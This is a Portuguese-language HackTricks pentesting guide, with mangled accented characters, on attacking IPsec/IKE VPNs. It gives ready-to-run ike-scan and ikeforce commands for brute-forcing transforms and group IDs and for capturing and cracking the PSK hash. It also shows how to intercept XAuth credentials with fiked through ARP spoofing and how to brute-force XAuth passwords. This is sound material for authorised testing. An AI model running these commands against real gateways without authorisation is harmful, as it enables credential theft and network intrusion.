# 500/udp - Pentesting IPsec/IKE VPN

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
{% endhint %}

## Informa√ß√µes B√°sicas

**IPsec** √© amplamente reconhecido como a principal tecnologia para proteger comunica√ß√µes entre redes (LAN-to-LAN) e de usu√°rios remotos para o gateway da rede (acesso remoto), servindo como a espinha dorsal para solu√ß√µes de VPN corporativas.

O estabelecimento de uma **associa√ß√£o de seguran√ßa (SA)** entre dois pontos √© gerenciado pelo **IKE**, que opera sob a √©gide do ISAKMP, um protocolo projetado para autentica√ß√£o e troca de chaves. Este processo se desenrola em v√°rias fases:

* **Fase 1:** Um canal seguro √© criado entre dois pontos finais. Isso √© alcan√ßado atrav√©s do uso de uma Chave Pr√©-Compartilhada (PSK) ou certificados, empregando o modo principal, que envolve tr√™s pares de mensagens, ou **modo agressivo**.
* **Fase 1.5:** Embora n√£o seja obrigat√≥rio, esta fase, conhecida como Fase de Autentica√ß√£o Estendida, verifica a identidade do usu√°rio que tenta se conectar, exigindo um nome de usu√°rio e senha.
* **Fase 2:** Esta fase √© dedicada √† negocia√ß√£o dos par√¢metros para proteger dados com **ESP** e **AH**. Permite o uso de algoritmos diferentes dos da Fase 1 para garantir **Perfeita Confidencialidade Futuro (PFS)**, aumentando a seguran√ßa.

**Porta padr√£o:** 500/udp

## **Descubra** o servi√ßo usando nmap
```
root@bt:~# nmap -sU -p 500 172.16.21.200
Starting Nmap 5.51 (http://nmap.org) at 2011-11-26 10:56 IST
Nmap scan report for 172.16.21.200
Host is up (0.00036s latency).
PORT    STATE SERVICE
500/udp open  isakmp
MAC Address: 00:1B:D5:54:4D:E4 (Cisco Systems)
```
## **Encontrando uma transforma√ß√£o v√°lida**

A configura√ß√£o do IPSec pode ser preparada apenas para aceitar uma ou algumas transforma√ß√µes. Uma transforma√ß√£o √© uma combina√ß√£o de valores. **Cada transforma√ß√£o** cont√©m um n√∫mero de atributos como DES ou 3DES como o **algoritmo de criptografia**, SHA ou MD5 como o **algoritmo de integridade**, uma chave pr√©-compartilhada como o **tipo de autentica√ß√£o**, Diffie-Hellman 1 ou 2 como o **algoritmo de distribui√ß√£o de chaves** e 28800 segundos como a **vida √∫til**.

Ent√£o, a primeira coisa que voc√™ deve fazer √© **encontrar uma transforma√ß√£o v√°lida**, para que o servidor possa se comunicar com voc√™. Para isso, voc√™ pode usar a ferramenta **ike-scan**. Por padr√£o, o Ike-scan funciona no modo principal e envia um pacote para o gateway com um cabe√ßalho ISAKMP e uma √∫nica proposta com **oito transforma√ß√µes dentro dela**.

Dependendo da resposta, voc√™ pode obter algumas informa√ß√µes sobre o endpoint:
```
root@bt:~# ike-scan -M 172.16.21.200
Starting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
172.16.21.200    Main Mode Handshake returned
HDR=(CKY-R=d90bf054d6b76401)
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
VID=4048b7d56ebce88525e7de7f00d6c2d3c0000000 (IKE Fragmentation)

Ending ike-scan 1.9: 1 hosts scanned in 0.015 seconds (65.58 hosts/sec). 1 returned handshake; 0 returned notify
```
Como voc√™ pode ver na resposta anterior, h√° um campo chamado **AUTH** com o valor **PSK**. Isso significa que o vpn est√° configurado usando uma chave pr√©-compartilhada (e isso √© realmente bom para um pentester).\
**O valor da √∫ltima linha tamb√©m √© muito importante:**

* _0 retornou handshake; 0 retornou notify:_ Isso significa que o alvo **n√£o √© um gateway IPsec**.
* _**1 retornou handshake; 0 retornou notify:**_ Isso significa que o **alvo est√° configurado para IPsec e est√° disposto a realizar a negocia√ß√£o IKE, e uma ou mais das transforma√ß√µes que voc√™ prop√¥s s√£o aceit√°veis** (uma transforma√ß√£o v√°lida ser√° mostrada na sa√≠da).
* _0 retornou handshake; 1 retornou notify:_ Os gateways VPN respondem com uma mensagem de notifica√ß√£o quando **nenhuma das transforma√ß√µes √© aceit√°vel** (embora alguns gateways n√£o o fa√ßam, caso em que uma an√°lise adicional e uma proposta revisada devem ser tentadas).

Ent√£o, neste caso, j√° temos uma transforma√ß√£o v√°lida, mas se voc√™ estiver no 3¬∫ caso, ent√£o voc√™ precisa **for√ßar um pouco para encontrar uma transforma√ß√£o v√°lida:**

Primeiro de tudo, voc√™ precisa criar todas as transforma√ß√µes poss√≠veis:
```bash
for ENC in 1 2 3 4 5 6 7/128 7/192 7/256 8; do for HASH in 1 2 3 4 5 6; do for AUTH in 1 2 3 4 5 6 7 8 64221 64222 64223 64224 65001 65002 65003 65004 65005 65006 65007 65008 65009 65010; do for GROUP in 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18; do echo "--trans=$ENC,$HASH,$AUTH,$GROUP" >> ike-dict.txt ;done ;done ;done ;done
```
E ent√£o fa√ßa brute-force em cada um usando ike-scan (isso pode levar v√°rios minutos):
```bash
while read line; do (echo "Valid trans found: $line" && sudo ike-scan -M $line <IP>) | grep -B14 "1 returned handshake" | grep "Valid trans found" ; done < ike-dict.txt
```
Se o brute-force n√£o funcionou, talvez o servidor esteja respondendo sem handshakes mesmo para transforma√ß√µes v√°lidas. Ent√£o, voc√™ poderia tentar o mesmo brute-force, mas usando o modo agressivo:
```bash
while read line; do (echo "Valid trans found: $line" && ike-scan -M --aggressive -P handshake.txt $line <IP>) | grep -B7 "SA=" | grep "Valid trans found" ; done < ike-dict.txt
```
Espero que **uma transforma√ß√£o v√°lida seja retornada**.\
Voc√™ pode tentar o **mesmo ataque** usando [**iker.py**](https://github.com/isaudits/scripts/blob/master/iker.py).\
Voc√™ tamb√©m pode tentar for√ßar transforma√ß√µes com [**ikeforce**](https://github.com/SpiderLabs/ikeforce):
```bash
./ikeforce.py <IP> # No parameters are required for scan -h for additional help
```
![](<../.gitbook/assets/image (617).png>)

Em **DH Group: 14 = 2048-bit MODP** e **15 = 3072-bit**\
**2 = HMAC-SHA = SHA1 (neste caso). O formato `--trans` √© $Enc,$Hash,$Auth,$DH**

A Cisco indica evitar o uso dos grupos DH 1 e 2 porque n√£o s√£o fortes o suficiente. Especialistas acreditam que **pa√≠ses com muitos recursos podem facilmente quebrar a criptografia** de dados que usam esses grupos fracos. Isso √© feito usando um m√©todo especial que os prepara para quebrar os c√≥digos rapidamente. Embora custe muito dinheiro para configurar esse m√©todo, ele permite que esses pa√≠ses poderosos leiam os dados criptografados em tempo real se estiver usando um grupo que n√£o √© forte (como 1.024 bits ou menor).

### Fingerprinting de servidor

Ent√£o, voc√™ pode usar ike-scan para tentar **descobrir o fornecedor** do dispositivo. A ferramenta envia uma proposta inicial e para de reproduzir. Em seguida, ela **analisa** a **diferen√ßa** de **tempo** **entre** as **mensagens** recebidas do servidor e o padr√£o de resposta correspondente, o pentester pode identificar com sucesso o fornecedor do gateway VPN. Al√©m disso, alguns servidores VPN usar√£o a **carga √∫til opcional de Vendor ID (VID)** com IKE.

**Especifique a transforma√ß√£o v√°lida, se necess√°rio** (usando --trans)

Se o IKE descobrir qual √© o fornecedor, ele imprimir√°:
```
root@bt:~# ike-scan -M --showbackoff 172.16.21.200
Starting ike-scan 1.9 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
172.16.21.200    Main Mode Handshake returned
HDR=(CKY-R=4f3ec84731e2214a)
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
VID=4048b7d56ebce88525e7de7f00d6c2d3c0000000 (IKE Fragmentation)

IKE Backoff Patterns:

IP Address       No.  Recv time            Delta Time
172.16.21.200    1    1322286031.744904    0.000000
172.16.21.200    2    1322286039.745081    8.000177
172.16.21.200    3    1322286047.745989    8.000908
172.16.21.200    4    1322286055.746972    8.000983
172.16.21.200    Implementation guess: Cisco VPN Concentrator

Ending ike-scan 1.9: 1 hosts scanned in 84.080 seconds (0.01 hosts/sec). 1 returned handshake; 0 returned notify
```
Isso tamb√©m pode ser alcan√ßado com o script nmap _**ike-version**_

## Encontrando o ID correto (nome do grupo)

Para ser permitido capturar o hash, voc√™ precisa de uma transforma√ß√£o v√°lida que suporte o modo agressivo e o ID correto (nome do grupo). Provavelmente, voc√™ n√£o saber√° o nome do grupo v√°lido, ent√£o ter√° que for√ß√°-lo.\
Para isso, eu recomendaria 2 m√©todos:

### For√ßando ID com ike-scan

Primeiramente, tente fazer uma solicita√ß√£o com um ID falso tentando coletar o hash ("-P"):
```bash
ike-scan -P -M -A -n fakeID <IP>
```
Se **nenhum hash for retornado**, ent√£o provavelmente este m√©todo de for√ßa bruta funcionar√°. **Se algum hash for retornado, isso significa que um hash falso ser√° enviado de volta para um ID falso, ent√£o este m√©todo n√£o ser√° confi√°vel** para for√ßar o ID. Por exemplo, um hash falso pode ser retornado (isso acontece em vers√µes modernas):

![](<../.gitbook/assets/image (917).png>)

Mas se, como eu disse, nenhum hash for retornado, ent√£o voc√™ deve tentar for√ßar nomes de grupos comuns usando ike-scan.

Este script **tentar√° for√ßar poss√≠veis IDs** e retornar√° os IDs onde um handshake v√°lido √© retornado (este ser√° um nome de grupo v√°lido).

Se voc√™ descobriu uma transforma√ß√£o espec√≠fica, adicione-a no comando ike-scan. E se voc√™ descobriu v√°rias transforma√ß√µes, sinta-se √† vontade para adicionar um novo loop para tentar todas elas (voc√™ deve tentar todas at√© que uma delas funcione corretamente).

Voc√™ pode usar o [dicion√°rio do ikeforce](https://github.com/SpiderLabs/ikeforce/blob/master/wordlists/groupnames.dic) ou [o que est√° em seclists](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/ike-groupid.txt) de nomes de grupos comuns para for√ß√°-los:
```bash
while read line; do (echo "Found ID: $line" && sudo ike-scan -M -A -n $line <IP>) | grep -B14 "1 returned handshake" | grep "Found ID:"; done < /usr/share/wordlists/external/SecLists/Miscellaneous/ike-groupid.txt
```
Or use this dict (√© uma combina√ß√£o dos outros 2 dicts sem repeti√ß√µes):

{% file src="../.gitbook/assets/vpnIDs.txt" %}

### Brutefor√ßando ID com Iker

[**iker.py**](https://github.com/isaudits/scripts/blob/master/iker.py) tamb√©m usa **ike-scan** para brutefor√ßar poss√≠veis nomes de grupos. Ele segue seu pr√≥prio m√©todo para **encontrar um ID v√°lido com base na sa√≠da do ike-scan**.

### Brutefor√ßando ID com ikeforce

[**ikeforce.py**](https://github.com/SpiderLabs/ikeforce) √© uma ferramenta que pode ser usada para **brutefor√ßar IDs tamb√©m**. Esta ferramenta ir√° **tentar explorar diferentes vulnerabilidades** que poderiam ser usadas para **distinguir entre um ID v√°lido e um n√£o v√°lido** (pode ter falsos positivos e falsos negativos, por isso prefiro usar o m√©todo ike-scan se poss√≠vel).

Por padr√£o, **ikeforce** enviar√° no in√≠cio alguns IDs aleat√≥rios para verificar o comportamento do servidor e determinar a t√°tica a ser usada.

* O **primeiro m√©todo** √© brutefor√ßar os nomes dos grupos **procurando** pela informa√ß√£o **Dead Peer Detection DPD** dos sistemas Cisco (essa informa√ß√£o √© apenas respondida pelo servidor se o nome do grupo estiver correto).
* O **segundo m√©todo** dispon√≠vel √© **verificar o n√∫mero de respostas enviadas a cada tentativa** porque √†s vezes mais pacotes s√£o enviados quando o ID correto √© usado.
* O **terceiro m√©todo** consiste em **procurar por "INVALID-ID-INFORMATION" em resposta a um ID incorreto**.
* Finalmente, se o servidor n√£o responder nada aos cheques, **ikeforce** tentar√° brutefor√ßar o servidor e verificar se, quando o ID correto √© enviado, o servidor responde com algum pacote.\
Obviamente, o objetivo de brutefor√ßar o ID √© obter o **PSK** quando voc√™ tem um ID v√°lido. Ent√£o, com o **ID** e **PSK** voc√™ ter√° que brutefor√ßar o XAUTH (se estiver habilitado).

Se voc√™ descobriu uma transforma√ß√£o espec√≠fica, adicione-a no comando ikeforce. E se voc√™ descobriu v√°rias transforma√ß√µes, sinta-se √† vontade para adicionar um novo loop para tentar todas (voc√™ deve tentar todas at√© que uma delas funcione corretamente).
```bash
git clone https://github.com/SpiderLabs/ikeforce.git
pip install 'pyopenssl==17.2.0' #It is old and need this version of the library
```

```bash
./ikeforce.py <IP> -e -w ./wordlists/groupnames.dic
```
### Sniffing ID

(Do livro **Network Security Assessment: Know Your Network**): Tamb√©m √© poss√≠vel obter nomes de usu√°rio v√°lidos ao sniffar a conex√£o entre o cliente VPN e o servidor, j√° que o primeiro pacote do modo agressivo contendo o ID do cliente √© enviado em texto claro.

![](<../.gitbook/assets/image (891).png>)

## Capturando & quebrando o hash

Finalmente, se voc√™ encontrou uma **transforma√ß√£o v√°lida** e o **nome do grupo** e se o **modo agressivo √© permitido**, ent√£o voc√™ pode facilmente capturar o hash quebr√°vel:
```bash
ike-scan -M -A -n <ID> --pskcrack=hash.txt <IP> #If aggressive mode is supported and you know the id, you can get the hash of the passwor
```
O hash ser√° salvo dentro de _hash.txt_.

Voc√™ pode usar **psk-crack**, **john** (usando [**ikescan2john.py**](https://github.com/truongkma/ctf-tools/blob/master/John/run/ikescan2john.py)) e **hashcat** para **crack** o hash:
```bash
psk-crack -d <Wordlist_path> psk.txt
```
## **XAuth**

**O modo agressivo IKE** combinado com uma **Chave Pr√©-Compartilhada (PSK)** √© comumente empregado para fins de **autentica√ß√£o em grupo**. Este m√©todo √© aumentado por **XAuth (Autentica√ß√£o Estendida)**, que serve para introduzir uma camada adicional de **autentica√ß√£o de usu√°rio**. Essa autentica√ß√£o normalmente utiliza servi√ßos como **Microsoft Active Directory**, **RADIUS** ou sistemas compar√°veis.

Ao transitar para **IKEv2**, uma mudan√ßa not√°vel √© observada onde **EAP (Protocolo de Autentica√ß√£o Extens√≠vel)** √© utilizado em vez de **XAuth** para o prop√≥sito de autenticar usu√°rios. Essa mudan√ßa destaca uma evolu√ß√£o nas pr√°ticas de autentica√ß√£o dentro dos protocolos de comunica√ß√£o segura.

### Captura de credenciais MitM na rede local

Assim, voc√™ pode capturar os dados de login usando _fiked_ e ver se h√° algum nome de usu√°rio padr√£o (Voc√™ precisa redirecionar o tr√°fego IKE para `fiked` para sniffing, o que pode ser feito com a ajuda de spoofing ARP, [mais informa√ß√µes](https://opensourceforu.com/2012/01/ipsec-vpn-penetration-testing-backtrack-tools/)). Fiked atuar√° como um ponto final de VPN e capturar√° as credenciais XAuth:
```bash
fiked -g <IP> -k testgroup:secretkey -l output.txt -d
```
Tamb√©m, usando IPSec, tente fazer um ataque MitM e bloquear todo o tr√°fego para a porta 500. Se o t√∫nel IPSec n√£o puder ser estabelecido, talvez o tr√°fego seja enviado em claro.

### For√ßando a senha e o nome de usu√°rio XAUTH com ikeforce

Para for√ßar a senha do **XAUTH** (quando voc√™ conhece um nome de grupo v√°lido **id** e o **psk**), voc√™ pode usar um nome de usu√°rio ou uma lista de nomes de usu√°rio e uma lista de senhas:
```bash
./ikeforce.py <IP> -b -i <group_id> -u <username> -k <PSK> -w <passwords.txt> [-s 1]
```
Dessa forma, o ikeforce tentar√° se conectar usando cada combina√ß√£o de nome de usu√°rio:senha.

Se voc√™ encontrou uma ou v√°rias transforma√ß√µes v√°lidas, basta us√°-las como nos passos anteriores.

## Autentica√ß√£o com um VPN IPSEC

No Kali, **VPNC** √© utilizado para estabelecer t√∫neis IPsec. Os **perfis** devem estar localizados no diret√≥rio `/etc/vpnc/`. Voc√™ pode iniciar esses perfis usando o comando _**vpnc**_.

Os seguintes comandos e configura√ß√µes ilustram o processo de configura√ß√£o de uma conex√£o VPN com VPNC:
```bash
root@system:~# cat > /etc/vpnc/samplevpn.conf << STOP
IPSec gateway [VPN_GATEWAY_IP]
IPSec ID [VPN_CONNECTION_ID]
IPSec secret [VPN_GROUP_SECRET]
IKE Authmode psk
Xauth username [VPN_USERNAME]
Xauth password [VPN_PASSWORD]
STOP
root@system:~# vpnc samplevpn
VPNC started in background (pid: [PID])...
root@system:~# ifconfig tun0
```
Neste setup:

* Substitua `[VPN_GATEWAY_IP]` pelo endere√ßo IP real do gateway VPN.
* Substitua `[VPN_CONNECTION_ID]` pelo identificador da conex√£o VPN.
* Substitua `[VPN_GROUP_SECRET]` pelo segredo do grupo da VPN.
* Substitua `[VPN_USERNAME]` e `[VPN_PASSWORD]` pelas credenciais de autentica√ß√£o da VPN.
* `[PID]` simboliza o ID do processo que ser√° atribu√≠do quando `vpnc` for iniciado.

Certifique-se de que valores reais e seguros sejam usados para substituir os espa√ßos reservados ao configurar a VPN.

## Material de Refer√™ncia

* [PSK cracking paper](http://www.ernw.de/download/pskattack.pdf)
* [SecurityFocus Infocus](http://www.securityfocus.com/infocus/1821)
* [Scanning a VPN Implementation](http://www.radarhack.com/dir/papers/Scanning\_ike\_with\_ikescan.pdf)
* Network Security Assessment 3rd Edition

## Shodan

* `port:500 IKE`

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
</details>
{% endhint %}
